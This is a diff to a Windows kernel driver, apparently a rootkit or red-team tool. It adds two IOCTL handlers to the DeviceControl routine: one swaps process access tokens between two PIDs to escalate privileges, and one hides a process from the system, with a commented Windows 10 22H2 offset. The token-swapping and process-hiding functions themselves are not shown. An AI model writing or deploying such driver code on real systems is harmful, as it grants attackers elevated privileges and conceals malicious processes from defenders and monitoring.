@@ -385,6 +385,37 @@ NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 			}
             break;
 		}
+        case IOCTL_PROC_TOKEN_SWAP:
+        {
+            elevateProcArgs args = *(elevateProcArgs*)Irp->AssociatedIrp.SystemBuffer;
+            DWORD pid1 = args.pid1;
+            DWORD pid2 = args.pid2;
+            int offset = args.offset;
+            status = procTokenSwap(pid1, pid2, offset);
+            if (!NT_SUCCESS(status)) {
+                DbgPrintEx(0, 0, "[%s] Failed to swap tokens between PID %lu and PID %lu\n", DRIVER_NAME, (unsigned long)pid1, (unsigned long)pid2);
+            }
+            else {
+                DbgPrintEx(0, 0, "[%s] Successfully swapped tokens between PID %lu and PID %lu\n", DRIVER_NAME, (unsigned long)pid1, (unsigned long)pid2);
+            }
+            break;
+        }
+        case IOCTL_UMPROC_HIDE:
+        {
+			hideProcArgs args = *(hideProcArgs*)Irp->AssociatedIrp.SystemBuffer;
+
+			DWORD pidVal = args.pid;
+            int offset = args.offset;
+            //int offset = 0x448; // Windows 10 22H2 x64 offset
+            status = procHiding(pidVal, offset);
+            if (!NT_SUCCESS(status)) {
+                DbgPrintEx(0, 0, "[%s] Failed to hide process with PID %lu\n", DRIVER_NAME, (unsigned long)pidVal);
+            }
+            else {
+                DbgPrintEx(0, 0, "[%s] Successfully hid process with PID %lu\n", DRIVER_NAME, (unsigned long)pidVal);
+            }
+			break;
+        }
         default:
             status = STATUS_INVALID_DEVICE_REQUEST;
             DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_WARNING_LEVEL,
